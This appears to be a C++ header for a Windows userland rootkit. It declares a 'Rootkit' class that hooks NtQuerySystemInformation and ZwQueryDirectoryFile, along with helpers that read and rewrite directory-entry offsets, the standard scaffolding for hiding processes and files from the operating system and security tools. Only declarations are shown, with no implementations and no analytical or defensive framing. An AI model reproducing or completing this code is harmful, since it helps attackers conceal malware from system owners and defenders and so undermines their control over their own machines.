class Rootkit
{
public:
	static void Initialize();
	static void DebugLog(wstring str);
private:
	typedef NTSTATUS(WINAPI *NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS systemInformationClass, SystemProcessInformationEx *systemInformation, ULONG systemInformationLength, PULONG returnLength);
	typedef NTSTATUS(*ZwQueryDirectoryFile)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FileInformationClassEx FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan);

	static NtQuerySystemInformation OriginalNtQuerySystemInformation;
	static ZwQueryDirectoryFile OriginalZwQueryDirectoryFile;

	static NTSTATUS WINAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS systemInformationClass, SystemProcessInformationEx *systemInformation, ULONG systemInformationLength, PULONG returnLength);
	static NTSTATUS HookedZwQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FileInformationClassEx FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan);
	static WCHAR* GetFileDirEntryFileName(PVOID FileInformation, FileInformationClassEx FileInfoClass);
	static ULONG GetFileNextEntryOffset(PVOID fileInformation, FileInformationClassEx fileInfoClass);
	static void SetFileNextEntryOffset(PVOID fileInformation, FileInformationClassEx fileInfoClass, ULONG value);
};